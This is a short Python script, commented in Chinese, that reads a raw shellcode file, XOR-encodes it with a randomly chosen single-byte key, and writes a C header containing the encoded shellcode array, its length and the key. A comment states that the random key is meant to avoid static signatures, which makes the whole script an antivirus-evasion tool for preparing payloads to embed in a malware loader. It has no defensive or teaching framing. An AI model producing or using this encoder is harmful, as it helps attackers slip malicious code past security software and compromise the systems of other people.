#!/usr/bin/env python3
"""
把 shell.bin ⇒ enc_shellcode.h
随机异或 key，每次生成都不同。
"""
import os, random, textwrap, pathlib

KEY = random.randint(1, 255)           # ❶ 随机 key，避免静态签名
BIN = pathlib.Path("shell.bin").read_bytes()

enc = bytes(b ^ KEY for b in BIN)

with open("enc_shellcode.h", "w", encoding="utf-8") as fh:
    fh.write(f"#pragma once\n#define XOR_KEY 0x{KEY:02x}\n\n")
    fh.write("unsigned char shellcode[] = {\n")
    for i, b in enumerate(enc):
        fh.write(f"0x{b:02x},")
        if (i + 1) % 16 == 0:
            fh.write("\n")
    fh.write("\n};\n")
    fh.write(f"unsigned int shellcode_len = {len(enc)};\n")
